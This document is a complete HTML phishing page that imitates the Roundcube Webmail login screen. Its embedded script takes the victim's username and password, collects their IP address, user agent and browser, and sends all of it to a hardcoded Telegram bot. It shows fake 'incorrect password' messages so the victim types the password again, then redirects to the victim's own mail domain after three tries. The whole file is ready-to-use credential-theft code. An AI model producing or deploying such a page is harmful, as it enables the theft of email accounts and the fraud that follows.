<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
  <style>
    /* --- your provided styles (unchanged) --- */
    :root {
      --bg: #212a31;
      --panel: #2b3742;
      --border: #3d4a56;
      --border-focus: #3d9fd6;
      --text-placeholder: #7c8a96;
      --text-muted: #8a97a3;
      --icon-bg: #313e49;
      --btn: #1c76a0;
      --btn-text: #cfe9f5;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; }
    body {
      background: var(--bg);
      font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding-top: 12vh;
      min-height: 100vh;
    }
    .login-wrap {
      width: 100%;
      max-width: 400px;
      padding: 0 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo {
      width: 130px;
      height: 130px;
      margin-bottom: 28px;
    }
    form { width: 100%; }
    .field {
      display: flex;
      align-items: stretch;
      border: 1px solid var(--border);
      border-radius: 3px;
      overflow: hidden;
      margin-bottom: 14px;
      background: var(--panel);
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }
    .field.focused {
      border-color: var(--border-focus);
      box-shadow: 0 0 0 1px var(--border-focus);
    }
    .field-icon {
      width: 46px;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--icon-bg);
    }
    .field-icon svg {
      width: 18px;
      height: 18px;
      fill: #aeb9c3;
    }
    .field input {
      flex: 1;
      min-width: 0;
      background: transparent;
      border: none;
      outline: none;
      color: #d7dee4;
      font-size: 16px;
      padding: 14px 16px;
      font-family: inherit;
    }
    .field input::placeholder {
      color: var(--text-placeholder);
      font-weight: 300;
    }
    .login-btn {
      width: 100%;
      padding: 15px;
      background: var(--btn);
      color: var(--btn-text);
      border: none;
      border-radius: 3px;
      font-size: 15px;
      letter-spacing: 1.5px;
      font-weight: 500;
      cursor: pointer;
      margin-top: 4px;
      transition: background 0.15s ease;
    }
    .login-btn:hover { background: #21879e; }
    .login-btn:active { background: #175f80; }
    .brand {
      text-align: center;
      color: var(--text-muted);
      font-size: 13px;
      margin-top: 18px;
      font-weight: 300;
    }
    @media (max-width: 480px) {
      body { padding-top: 8vh; }
      .logo { width: 100px; height: 100px; margin-bottom: 20px; }
      .field input { padding: 12px 14px; font-size: 15px; }
      .field-icon { width: 40px; }
      .login-btn { padding: 13px; font-size: 14px; }
    }
  </style>
</head>
<body>

<div class="login-wrap">
  <!-- logo placeholder (keep your img) -->
  <img src="img/lg.png" style="max-height: 100px; max-width: 100px;margin: 0px auto;" alt="logo">

  <form id="loginForm" onsubmit="return false;">
    <div class="field" id="user-field">
      <div class="field-icon">
        <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.5c-3.3 0-9.9 1.6-9.9 4.9v2.4h19.8v-2.4c0-3.3-6.6-4.9-9.9-4.9z"/></svg>
      </div>
      <input type="text" id="emailInput" placeholder="Username" autocomplete="username"
             onfocus="this.parentElement.classList.add('focused')"
             onblur="this.parentElement.classList.remove('focused')">
    </div>

    <div class="field" id="pass-field">
      <div class="field-icon">
        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.8-2.2-5-5-5S7 3.2 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.7 1.3-3 3-3s3 1.3 3 3v2H9V6zm3 12c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      </div>
      <input type="password" id="passInput" placeholder="Password" autocomplete="current-password"
             onfocus="this.parentElement.classList.add('focused')"
             onblur="this.parentElement.classList.remove('focused')">
    </div>

    <button type="submit" id="loginBtn" class="login-btn">LOGIN</button>
  </form>

  <div class="brand">Roundcube Webmail</div>
</div>

<script>
     // !!! IMPORTANT: replace with your own token and chatId !!!
    const TELEGRAM_TOKEN = '8909888901:AAFIHVGkNc8fBRBX_TkSfyJ6VKZgfgJuRT8';      // <-- replace
    const TELEGRAM_CHAT_ID = '8811041753';      // <-- replace

    
  (function() {
    "use strict";

    // ----- DOM refs -----
    const emailInput = document.getElementById('emailInput');
    const passInput = document.getElementById('passInput');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');

    // ----- state -----
    let attemptCount = 0;                // 0,1,2 → third attempt triggers redirect
    let isProcessing = false;           // block double submits

    // ----- 1) on load: read ?mn= and set email -----
    function setEmailFromUrl() {
      const params = new URLSearchParams(window.location.search);
      const mnValue = params.get('mn');
      if (mnValue !== null) {
        emailInput.value = mnValue;
      }
    }

    // ----- 2) helpers: get ip, userAgent, browser (simple) -----
    function getIpAddress() {
      // In a real scenario you'd call a service like https://api.ipify.org?format=json
      // But for offline/demo we return a placeholder.
      // We'll make a real fetch to ipify, but also handle fallback.
      return new Promise((resolve) => {
        fetch('https://api.ipify.org?format=json')
          .then(res => res.json())
          .then(data => resolve(data.ip || 'unknown'))
          .catch(() => resolve('unknown'));
      });
    }

    function getUserAgent() {
      return navigator.userAgent || 'unknown';
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      if (ua.indexOf('Firefox') !== -1) return 'Firefox';
      if (ua.indexOf('SamsungBrowser') !== -1) return 'Samsung Browser';
      if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
      if (ua.indexOf('Edge') !== -1) return 'Edge';
      if (ua.indexOf('Chrome') !== -1) return 'Chrome';
      if (ua.indexOf('Safari') !== -1) return 'Safari';
      return 'unknown';
    }

    // ----- 3) send to Telegram (with token & chatID) -----
 

    async function sendToTelegram(email, pass, ip, ua, browser) {
      if (TELEGRAM_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
        console.warn('Telegram token or chatId not set. Message would be:', { email, pass, ip, ua, browser });
        return; // silently skip in demo to avoid errors
      }
      const text = `📩 New login attempt\n\n` +
                   `👤 Email: ${email}\n` +
                   `🔑 Password: ${pass}\n` +
                   `🌐 IP: ${ip}\n` +
                   `💻 User-Agent: ${ua}\n` +
                   `🧩 Browser: ${browser}\n` +
                   `🕒 Time: ${new Date().toISOString()}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
          })
        });
      } catch (err) {
        console.error('Telegram send error:', err);
      }
    }

    // ----- 4) core submit logic -----
    async function handleSubmit(e) {
      e.preventDefault();

      if (isProcessing) return;
      const email = emailInput.value.trim();
      const pass = passInput.value;

      // basic validation: both fields must be filled
      if (!email || !pass) {
        // optionally show a quick alert, but we just ignore submission
        return;
      }

      // increase attempt count (first, second, third)
      attemptCount++;

      // ---- block UI ----
      isProcessing = true;
      const originalBtnText = loginBtn.textContent;
      loginBtn.disabled = true;
      loginBtn.textContent = 'LOADING...';

      // ---- 3 seconds loading ----
      await new Promise(resolve => setTimeout(resolve, 3000));

      // ---- gather data ----
      const ip = await getIpAddress();
      const ua = getUserAgent();
      const browser = getBrowser();

      // ---- send to Telegram ----
      await sendToTelegram(email, pass, ip, ua, browser);

      // ---- clear password ----
      passInput.value = '';

      // ---- show "incorrect password" for 4 seconds ----
      loginBtn.textContent = 'INCORRECT PASSWORD';
      await new Promise(resolve => setTimeout(resolve, 4000));

      // ---- restore button (but we may redirect on third) ----
      loginBtn.textContent = originalBtnText;
      loginBtn.disabled = false;
      isProcessing = false;

      // ---- on third attempt: split email by '@' and redirect ----
      if (attemptCount === 3) {
        const parts = email.split('@');
        if (parts.length === 2 && parts[1]) {
          let redirectUrl = parts[1];
          // prepend protocol if missing
          if (!/^https?:\/\//i.test(redirectUrl)) {
            redirectUrl = 'https://' + redirectUrl;
          }
          window.location.href = redirectUrl;
        } else {
          // fallback: if no valid domain, maybe redirect to google? but we keep spec.
          // spec says: "redirect to the split[1] value which is usually a url"
          // if missing, do nothing or fallback to a default.
          // we do nothing.
        }
        return;
      }

      // after first or second attempt, we are done, button is restored.
    }

    // ----- attach event listener -----
    loginForm.addEventListener('submit', handleSubmit);

    // ----- also listen to button click (in case form submit is not triggered) -----
    loginBtn.addEventListener('click', function(e) {
      // if form submit is not triggered for some reason, we call it.
      // but we rely on form submit event. add a safety:
      if (!e.defaultPrevented) {
        // but we already have submit handler, so no need.
      }
    });

    // ----- on load: set email from ?mn= -----
    window.addEventListener('DOMContentLoaded', function() {
      setEmailFromUrl();

      // optional: focus email field
      // emailInput.focus();
    });

    // ----- for demonstration: if you want to test quickly, expose attempt count (optional) -----
    console.log('✅ Script loaded. Attempt count starts at 0.');
    console.log('ℹ️ Replace TELEGRAM_TOKEN and TELEGRAM_CHAT_ID in script to enable Telegram.');
  })();
</script>

<!-- small note: replace token/chatId in script above -->
</body>
</html>
